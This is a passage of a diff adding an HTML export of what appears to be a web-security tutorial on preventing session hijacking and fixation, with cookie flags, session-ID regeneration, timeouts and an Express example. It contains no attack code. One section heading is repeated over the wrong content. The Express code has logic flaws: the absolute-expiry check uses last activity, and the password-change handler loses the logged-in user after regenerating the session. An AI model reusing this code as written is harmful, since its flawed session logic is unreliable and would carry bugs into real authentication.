+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80a4-940a-d6d2b42397fa" class=""><strong>2. HttpOnly Cookies:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80cf-bc5c-dad24639d15c" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Prevents JavaScript access (XSS protection)
+Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-801c-85a3-ea98f80c157e" class=""><strong>3. Strong Session IDs:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80ed-8dfb-f0cd588517aa" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Generate cryptographically random session IDs
+const sessionId = crypto.randomBytes(32).toString(&#x27;hex&#x27;);
+// Long, random, unpredictable
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-809b-aa27-edde9192db45" class=""><strong>4. Short Session Expiration:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8051-99e9-ebd9765cd51b" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Limit session lifetime
+session.expires = Date.now() + 15 * 60 * 1000;  // 15 minutes
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8039-a9bf-e74bf27514bd" class=""><strong>5. Inactivity Timeout:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8087-9343-e00ebefc817e" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Expire session after inactivity
+if (session.lastActivity &lt; Date.now() - 5 * 60 * 1000) {
+  // 5 minutes inactivity
+  invalidateSession(session);
+}
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-807a-9ab1-c3c02d3d71fe" class=""><strong>6. IP Address Validation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8086-b464-ff0872ca2b97" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Validate session IP matches original
+if (session.ipAddress !== request.ip) {
+  // IP changed - invalidate session
+  invalidateSession(session);
+}
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-809b-baea-fa92ac3f1d61" class=""><strong>Mitigations for Session Fixation</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-808a-b77c-ce8c6f5d0a37" class=""><strong>1. Use Secure Connections (HTTPS):</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8003-bfe7-e167afdf3766" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Always use HTTPS
+// Prevents network sniffing
+Set-Cookie: sessionid=abc123; Secure; HttpOnly
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-807e-9be8-f965901a37f2" class=""><strong>2. HttpOnly Cookies:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80b2-8eeb-c5e563ef0ee2" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Prevents JavaScript access (XSS protection)
+Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-806e-b478-c721647469ce" class=""><strong>3. Strong Session IDs:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-803f-8e09-eddf6b65bd0c" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Generate cryptographically random session IDs
+const sessionId = crypto.randomBytes(32).toString(&#x27;hex&#x27;);
+// Long, random, unpredictable
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80da-9ae8-ecfecfa128de" class=""><strong>4. Short Session Expiration:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8077-8e7a-d0a8076f42ba" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Limit session lifetime
+session.expires = Date.now() + 15 * 60 * 1000;  // 15 minutes
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80d7-9c5a-f05137a64574" class=""><strong>5. Inactivity Timeout:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8018-a4e4-ef36fe0c450c" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Expire session after inactivity
+if (session.lastActivity &lt; Date.now() - 5 * 60 * 1000) {
+  // 5 minutes inactivity
+  invalidateSession(session);
+}
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-801a-8b67-d356713ca4b0" class=""><strong>6. IP Address Validation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80cc-b358-f1266442e5ef" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Validate session IP matches original
+if (session.ipAddress !== request.ip) {
+  // IP changed - invalidate session
+  invalidateSession(session);
+}
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-80b3-b8e0-fd031696b5ac" class=""><strong>Mitigations for Session Fixation</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8029-9825-d085d5e8b8f9" class=""><strong>1. Regenerate Session ID After Login:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8063-ab00-dc97b4720233" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Most important mitigation!
+function login(user) {
+  // Authenticate user
+  authenticateUser(user);
+
+  // Regenerate session ID
+  const oldSessionId = req.session.id;
+  regenerateSessionId();
+  const newSessionId = req.session.id;
+
+  // Old session ID is now invalid
+  // Only new session ID works
+}
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80d4-ab21-d86c56f9565e" class=""><strong>2. Regenerate After Security Events:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8019-aeff-d2c00250f27b" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// After password change
+function changePassword(user, newPassword) {
+  updatePassword(user, newPassword);
+  regenerateSessionId();  // Important!
+}
+
+// After privilege escalation
+function escalatePrivileges(user) {
+  updatePrivileges(user);
+  regenerateSessionId();  // Important!
+}
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-802f-b05c-d1aba3ba5606" class=""><strong>3. Don&#x27;t Accept Session IDs from URL:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80b5-89c5-c8f81aa1472c" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// ❌ WRONG: Accepting session ID from URL
+const sessionId = req.query.sessionid;  // Dangerous!
+
+// ✅ CORRECT: Only use cookies
+const sessionId = req.cookies.sessionid;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80ca-9455-d545581b1ef5" class=""><strong>4. Validate Session Creation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8001-a05d-cc09ecd97ca8" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Don&#x27;t allow users to set their own session IDs
+// Always generate new session ID on server
+function createSession(user) {
+  // Server generates session ID
+  const sessionId = generateRandomSessionId();
+  // Never accept session ID from client
+}
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2cf562ad-76f0-806a-8af0-cacc65cb1617"/></div><div style="display:contents" dir="auto"><h2 id="2cf562ad-76f0-80c7-b7c3-c2d07d5083b3" class=""><strong>Best Practices</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-809f-ba48-f5b61a4e4912" class=""><strong>Session Security Best Practices</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80ce-8725-c3dfe6ee81f5" class=""><strong>1. Use HTTPS Everywhere:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-800f-b4df-f4601a9b3601" class="bulleted-list"><li style="list-style-type:disc">✅ All session-related communication over HTTPS</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8000-88a8-cd32aa4de351" class="bulleted-list"><li style="list-style-type:disc">✅ Secure flag on cookies</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8006-8705-f9ccbf798dd7" class="bulleted-list"><li style="list-style-type:disc">✅ Prevents network sniffing</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-801a-9b22-c0922b70d59e" class=""><strong>2. HttpOnly Cookies:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8091-a8cb-d598e03d85c1" class="bulleted-list"><li style="list-style-type:disc">✅ Prevents JavaScript access</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80f3-8da8-c2b962fa5901" class="bulleted-list"><li style="list-style-type:disc">✅ Protects from XSS attacks</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8090-8d43-cfa472153de7" class="bulleted-list"><li style="list-style-type:disc">✅ Essential for session security</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80bf-9bf9-c22dc115f468" class=""><strong>3. Secure Cookies:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-803e-8fb8-d4ae2f8f6874" class="bulleted-list"><li style="list-style-type:disc">✅ HTTPS-only transmission</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-801f-8efb-ea2b68840ade" class="bulleted-list"><li style="list-style-type:disc">✅ Prevents interception over HTTP</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8023-bcbc-f053cbfe2366" class="bulleted-list"><li style="list-style-type:disc">✅ Required for production</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80a9-821d-f7be28df152b" class=""><strong>4. SameSite Attribute:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8062-b17c-f3bfa58825bb" class="bulleted-list"><li style="list-style-type:disc">✅ Prevents CSRF attacks</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80db-813c-ddd2e4dd0646" class="bulleted-list"><li style="list-style-type:disc">✅ SameSite=Strict or Lax</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8099-b9ab-ea7130457c45" class="bulleted-list"><li style="list-style-type:disc">✅ Additional security layer</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8068-bba5-dee8a5acf6ea" class=""><strong>5. Strong Session IDs:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-802f-acf3-e9fb9e1a444b" class="bulleted-list"><li style="list-style-type:disc">✅ Cryptographically random</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80f9-81f7-cd48ba9a3176" class="bulleted-list"><li style="list-style-type:disc">✅ Sufficient length (at least 128 bits)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80ed-90f2-f0671f67a55e" class="bulleted-list"><li style="list-style-type:disc">✅ Unpredictable</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8069-9539-d96a040592e4" class=""><strong>6. Session Expiration:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80af-9996-d6ebc5a9f0b4" class="bulleted-list"><li style="list-style-type:disc">✅ Short absolute expiration (15-30 minutes)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80b5-9408-f2b7627d2e2b" class="bulleted-list"><li style="list-style-type:disc">✅ Inactivity timeout (5-10 minutes)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-808d-84a0-db6286a074dc" class="bulleted-list"><li style="list-style-type:disc">✅ Limits attack window</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8028-afae-ffd49c1f0e05" class=""><strong>7. Session ID Regeneration:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80f4-9750-de7f24259655" class="bulleted-list"><li style="list-style-type:disc">✅ After login (critical!)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-807d-b7b8-d7f5fcf65d83" class="bulleted-list"><li style="list-style-type:disc">✅ After password change</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8052-80ce-f650e3b31bf6" class="bulleted-list"><li style="list-style-type:disc">✅ After privilege escalation</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8008-bafe-eb1ab697f9ec" class="bulleted-list"><li style="list-style-type:disc">✅ After logout</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-801f-97ca-df27b6bd0080" class=""><strong>8. IP Address Validation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-808b-a76e-fa5686c87506" class="bulleted-list"><li style="list-style-type:disc">✅ Validate session IP matches</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8062-9c07-fa3085a5f238" class="bulleted-list"><li style="list-style-type:disc">✅ Invalidate if IP changes</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-805a-9be7-fe5762853bd4" class="bulleted-list"><li style="list-style-type:disc">✅ Balance security vs usability</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8024-acc2-d71df3d2c3ba" class=""><strong>9. Secure Session Storage:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8035-8c07-e327c2d9a5a7" class="bulleted-list"><li style="list-style-type:disc">✅ Encrypt session data</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8070-9ff3-f3c17a4b23c9" class="bulleted-list"><li style="list-style-type:disc">✅ Secure server-side storage</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-804a-a0b7-c72583802d2b" class="bulleted-list"><li style="list-style-type:disc">✅ Protect session database</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8083-9b14-e20cd74b0dff" class=""><strong>10. Monitoring and Logging:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-802f-ac88-c2912e81fbe5" class="bulleted-list"><li style="list-style-type:disc">✅ Log session creation/destruction</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80a7-b7ee-f945a35441be" class="bulleted-list"><li style="list-style-type:disc">✅ Monitor for suspicious activity</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8070-a2d4-f0cd8f659d48" class="bulleted-list"><li style="list-style-type:disc">✅ Alert on multiple sessions from same user</li></ul></div><div style="display:contents" dir="auto"><hr id="2cf562ad-76f0-8096-ae91-f6dd35057d98"/></div><div style="display:contents" dir="auto"><h2 id="2cf562ad-76f0-807d-9031-eabd3ec20cd1" class=""><strong>Implementation Examples</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-801a-81a0-fcf5afdc9d83" class=""><strong>Secure Session Management (Node.js/Express)</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80ca-8249-c75721e32131" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">const express = require(&#x27;express&#x27;);
+const session = require(&#x27;express-session&#x27;);
+const crypto = require(&#x27;crypto&#x27;);
+
+const app = express();
+
+// Secure session configuration
+app.use(session({
+  name: &#x27;sessionId&#x27;,
+  secret: process.env.SESSION_SECRET,  // Strong secret
+  resave: false,
+  saveUninitialized: false,
+  cookie: {
+    httpOnly: true,      // Prevents XSS
+    secure: true,        // HTTPS only
+    sameSite: &#x27;strict&#x27;,  // CSRF protection
+    maxAge: 15 * 60 * 1000  // 15 minutes
+  },
+  genid: () =&gt; {
+    // Generate strong, random session ID
+    return crypto.randomBytes(32).toString(&#x27;hex&#x27;);
+  }
+}));
+
+// Login endpoint
+app.post(&#x27;/login&#x27;, (req, res) =&gt; {
+  const { username, password } = req.body;
+
+  // Authenticate user
+  const user = authenticateUser(username, password);
+  if (!user) {
+    return res.status(401).json({ error: &#x27;Invalid credentials&#x27; });
+  }
+
+  // Regenerate session ID (prevent session fixation)
+  req.session.regenerate((err) =&gt; {
+    if (err) {
+      return res.status(500).json({ error: &#x27;Session error&#x27; });
+    }
+
+    // Create new session
+    req.session.userId = user.id;
+    req.session.username = user.username;
+    req.session.ipAddress = req.ip;  // Store IP for validation
+    req.session.lastActivity = Date.now();
+
+    res.json({ message: &#x27;Login successful&#x27; });
+  });
+});
+
+// Middleware: Validate session
+function validateSession(req, res, next) {
+  if (!req.session.userId) {
+    return res.status(401).json({ error: &#x27;Not authenticated&#x27; });
+  }
+
+  // Check expiration
+  if (req.session.lastActivity &lt; Date.now() - 15 * 60 * 1000) {
+    req.session.destroy();
+    return res.status(401).json({ error: &#x27;Session expired&#x27; });
+  }
+
+  // Check inactivity
+  if (req.session.lastActivity &lt; Date.now() - 5 * 60 * 1000) {
+    req.session.destroy();
+    return res.status(401).json({ error: &#x27;Session timeout&#x27; });
+  }
+
+  // Validate IP address (optional, can be strict)
+  if (req.session.ipAddress !== req.ip) {
+    // IP changed - invalidate session
+    req.session.destroy();
+    return res.status(401).json({ error: &#x27;Session invalidated&#x27; });
+  }
+
+  // Update last activity
+  req.session.lastActivity = Date.now();
+  next();
+}
+
+// Protected route
+app.get(&#x27;/account&#x27;, validateSession, (req, res) =&gt; {
+  res.json({ userId: req.session.userId });
+});
+
+// Password change
+app.post(&#x27;/change-password&#x27;, validateSession, (req, res) =&gt; {
+  const { oldPassword, newPassword } = req.body;
+
+  // Change password
+  changePassword(req.session.userId, oldPassword, newPassword);
+
+  // Regenerate session ID (important!)
+  req.session.regenerate((err) =&gt; {
+    if (err) {
+      return res.status(500).json({ error: &#x27;Session error&#x27; });
+    }
+
+    // Update session
+    req.session.lastActivity = Date.now();
+
+    res.json({ message: &#x27;Password changed&#x27; });
+  });
+});
+
+// Logout
+app.post(&#x27;/logout&#x27;, (req, res) =&gt; {
+  // Regenerate session ID (invalidate old)
+  req.session.regenerate((err) =&gt; {
+    req.session.destroy();
+    res.json({ message: &#x27;Logged out&#x27; });
+  });
+});
